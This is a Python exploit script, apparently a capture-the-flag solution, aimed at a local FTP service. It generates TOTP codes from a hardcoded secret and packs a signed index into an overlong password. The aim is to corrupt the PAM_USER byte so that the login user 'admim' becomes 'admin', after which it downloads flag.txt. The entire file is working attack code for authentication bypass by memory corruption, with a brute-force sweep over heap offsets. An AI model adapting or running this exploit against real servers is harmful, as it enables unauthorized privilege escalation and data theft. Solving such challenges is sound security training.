#!/usr/bin/env python3
"""Find a PAM_USER byte increment that changes admim to admin in one FTP session."""

import argparse
import base64
import ftplib
import hashlib
import hmac
import io
import json
import re
import struct
import time

SECRET = b"AAAAAAAAAAAAAAAA"
LO, HI = -0x2000, -0x6C0


def otp():
    d = hmac.new(
        base64.b32decode(SECRET), struct.pack(">Q", int(time.time() // 30)), hashlib.sha1
    ).digest()
    o = d[-1] & 0x0F
    return f"{(int.from_bytes(d[o : o + 4], 'big') & 0x7FFFFFFF) % 1000000:06d}".encode()


def password(idx):
    p = bytearray(b"P" * 62)
    c = otp()
    p[:6] = c
    p[6] = ord("X")
    p[7:9] = struct.pack("<h", idx)
    p[46:62] = SECRET
    if any(x in (0, 10, 13) for x in p[7:9]):
        return None
    return bytes(p).decode("latin-1")


def one(idx):
    pw = password(idx)
    if pw is None:
        return {"idx": idx, "status": "skip-wire-byte"}
    f = ftplib.FTP()
    f.encoding = "latin-1"
    out = {"idx": idx, "idx_hex": struct.pack("<h", idx).hex()}
    try:
        f.connect("127.0.0.1", 30029, timeout=6)
        out["login"] = f.login("admim", pw)
        buf = io.BytesIO()
        f.retrbinary("RETR stats.txt", buf.write)
        data = buf.getvalue().decode("utf-8", "replace")
        out["stats"] = data
        m = re.search(r"^user: (.*)\nlogins: (\d+)\n$", data)
        out["user"] = m.group(1) if m else None
        out["logins"] = int(m.group(2)) if m else None
        out["status"] = "ok"
        if out["user"] == "admin":
            try:
                out["files"] = f.nlst()
            except Exception as exc:
                out["files_error"] = repr(exc)
            try:
                flag = io.BytesIO()
                f.retrbinary("RETR flag.txt", flag.write)
                out["flag"] = flag.getvalue().decode("utf-8", "replace")
            except Exception as exc:
                out["flag_error"] = repr(exc)
    except Exception as exc:
        out["status"] = "error"
        out["error"] = repr(exc)
    finally:
        try:
            f.close()
        except Exception:
            pass
    return out


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--index", type=int, help="try one known journal index instead of sweeping")
    args = parser.parse_args()
    # An existing enrollment returns 530; authentication can still proceed.
    try:
        f = ftplib.FTP()
        f.encoding = "latin-1"
        f.connect("127.0.0.1", 30029, timeout=6)
        print("ENROLL", f.login("admim", "enroll"), flush=True)
        f.close()
    except Exception as exc:
        print("ENROLL_ERR", repr(exc), flush=True)

    total = 0
    ok = 0
    # The target byte is at offset 4 within a 16-byte-aligned allocation.
    indices = [args.index] if args.index is not None else range(LO + 4, HI, 16)
    for idx in indices:
        item = one(idx)
        total += 1
        if item.get("status") == "ok":
            ok += 1
        if item.get("user") not in (None, "admim") or "avito{" in item.get("stats", ""):
            print("HIT", json.dumps(item, ensure_ascii=False, sort_keys=True), flush=True)
        if total % 16 == 0:
            print("PROGRESS", total, "ok", ok, "last", idx, flush=True)
    print("SWEEP_DONE", total, "ok", ok, flush=True)


if __name__ == "__main__":
    main()
